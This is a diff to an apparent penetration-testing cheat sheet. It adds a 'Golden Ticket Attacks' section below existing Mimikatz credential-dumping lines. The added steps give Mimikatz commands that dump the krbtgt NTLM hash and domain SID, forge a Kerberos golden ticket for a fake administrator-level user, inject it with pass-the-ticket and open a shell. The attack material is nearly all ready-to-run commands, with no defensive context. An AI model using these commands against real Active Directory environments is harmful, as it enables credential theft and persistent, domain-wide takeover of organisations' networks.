@@ -123,5 +123,18 @@ mget *
 privilege::debug
 sekurlsa:logonpasswords
 ```
-# 
+# Golden Ticket Attacks
+- Using **Mimikatz**
+```bash
+privilege::debug
+lsadump::lsa /inject /name:krbtgt
+```
+- Copy SID of the domain and paste it into a safe place
+- Copy the NTLM hash for the **krbtgt** account and paste it into a safe place
+- Now, generate a golden ticket
+```powershell
+kerberos::golden /User:Fakeuser /domain:<domain name> /sid:<SID> /krbtgt:<NTLM hash> /id:500 /ptt
 
+# Interact with the session using PTT, use cmd:
+misc::cmd
+```
